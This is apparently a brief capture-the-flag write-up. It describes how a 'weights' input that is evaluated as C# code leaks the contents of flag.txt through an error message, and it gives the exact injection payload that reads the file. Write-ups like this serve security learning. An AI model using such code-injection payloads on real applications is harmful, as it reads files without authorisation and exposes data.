If you write something strange in the weights you will see a huge error message suggesting code injection.

Since the flag content is not an integer, the error message directly outputs the flag.

Sending `{ int.Parse(System.IO.File.ReadAllText("flag.txt")), 0, 0 }` worked.
